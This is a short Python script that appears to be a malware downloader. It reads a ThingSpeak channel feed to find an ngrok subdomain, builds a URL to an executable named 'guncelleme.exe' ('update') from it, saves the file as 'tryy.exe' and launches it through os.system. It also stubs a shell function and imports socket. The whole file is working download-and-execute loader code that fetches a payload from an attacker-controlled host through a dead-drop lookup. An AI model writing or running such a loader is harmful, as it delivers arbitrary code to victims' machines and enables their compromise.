import os
import requests as R
import time
import socket as S
import requests as R




def get_data_from_cloud():
	istek = R.get("https://api.thingspeak.com/channels/<channel-number>/feeds.json?results=1").text
	dataishere =  istek.split('"field1":"')[-1]
	subdomain = dataishere.split('","field2":"')[0]
	return "http://"+subdomain.split('","')[0]+".ngrok.io/guncelleme.exe"

def cmd(string):
	os.system(string)


def start_shell():
	pass

def download_file(url, filename):
	u = R.get(url).content
	localFile = open(filename, 'wb')
	localFile.write(u)
	localFile.close()

def runfile(filename):
	cmd("start " + filename)


#while True:
isim = "tryy.exe"
adres = get_data_from_cloud()
download_file(adres, isim)
runfile(isim)
